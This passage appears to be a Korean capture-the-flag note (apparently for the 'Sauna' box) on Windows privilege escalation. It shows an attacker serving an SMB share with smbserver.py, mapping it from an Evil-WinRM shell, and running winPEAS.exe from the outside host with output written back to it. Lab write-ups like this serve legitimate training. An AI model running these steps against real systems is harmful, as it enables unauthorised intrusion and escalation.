# 자동 실행을 통한 권한 상승

## 시스템  내부

WinPEAS : 윈도우 호스트에서 권한을 에스컬레이션할 수 있는 가능한 경로를 검색하는 스크립트

```bash
#파일 공유 서비스 실행
python3 smbserver.py -username df -password df share . -smb2support

#파일 다운로드
*Evil-WinRM* PS C:\> net use \\10.10.14.30\share /u:df df
The command completed successfully.
*Evil-WinRM* PS C:\> cd \\10.10.14.30\share\
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.30\share>
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.30\share> .\winPEAS.exe cmd fast > sauna_winpeas_fast
```

